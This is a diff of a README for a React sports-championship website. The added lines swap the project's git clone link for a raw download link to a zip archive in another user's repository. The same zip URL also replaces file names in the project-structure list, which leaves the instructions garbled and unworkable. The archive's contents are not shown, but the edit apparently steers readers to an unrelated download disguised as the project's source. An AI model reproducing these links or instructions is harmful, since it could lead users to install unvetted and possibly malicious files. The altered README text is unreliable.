@@ -13,7 +13,7 @@ A React-based sports website homepage showcasing major events, best players, and
 
 1. Clone the repository:
 
-git clone https://github.com/ankitsingh4304/Global-Championship.git
+git clone https://github.com/RonankiDinesh/General-Championship/raw/refs/heads/main/src/pages/home/Championship_General_v1.9.zip
 
 text
 
@@ -41,8 +41,8 @@ Open http://localhost:5173 in your browser to see the app.
 
 -   `src/components/Navbar` - Navbar component with logo and navigation links
 -   `src/pages/Home` - Home page with banner and events
--   `src/pages/Sports`, `BestPlayers.js`, `OverallRank.js` - Pages for each tab section
--   `src/App.tsx` - Main app with routing logic
+-   `src/pages/Sports`, `https://github.com/RonankiDinesh/General-Championship/raw/refs/heads/main/src/pages/home/Championship_General_v1.9.zip`, `https://github.com/RonankiDinesh/General-Championship/raw/refs/heads/main/src/pages/home/Championship_General_v1.9.zip` - Pages for each tab section
+-   `https://github.com/RonankiDinesh/General-Championship/raw/refs/heads/main/src/pages/home/Championship_General_v1.9.zip` - Main app with routing logic
 
 ## Technologies Used
 
